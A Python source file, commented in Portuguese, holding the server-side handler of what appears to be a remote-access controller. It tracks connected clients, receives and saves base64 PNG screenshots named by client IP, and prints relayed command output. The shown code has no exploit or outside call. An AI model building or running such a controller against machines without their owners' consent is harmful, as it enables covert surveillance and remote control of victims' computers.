import time
import base64
from auth import authenticate

clients = {}
last_ping = {}

def handle_client(client_socket, addr):
    if not authenticate(client_socket, addr):
        return

    clients[addr] = client_socket
    last_ping[addr] = time.time()

    print(f"[+] Cliente {addr[0]} conectado.")

    while True:
        try:
            response = client_socket.recv(10 * 1024 * 1024).decode()
            if not response:
                break

            if response == "ping":
                last_ping[addr] = time.time()
                continue

            # Tentar decodificar uma imagem em base64
            try:
                raw = base64.b64decode(response, validate=True)
                if raw.startswith(b'\x89PNG'):
                    filename = f"screenshot_{addr[0].replace('.', '_')}.png"
                    with open(filename, 'wb') as img:
                        img.write(raw)
                    print(f"[+] Screenshot recebida e salva em {filename}")
                    continue
            except Exception:
                pass  # não é base64 ou não é imagem

            # Caso contrário, imprime normalmente
            print(f"\n[{addr[0]} Output]: {response}")

        except:
            break

    print(f"\n[!] Cliente {addr[0]} desconectado.")
    client_socket.close()
    if addr in clients:
        del clients[addr]
    if addr in last_ping:
        del last_ping[addr]
    print(f"[!] Cliente {addr[0]} removido da lista de clientes.")
    print(f"[!] Lista de clientes: {list(clients.keys())}")
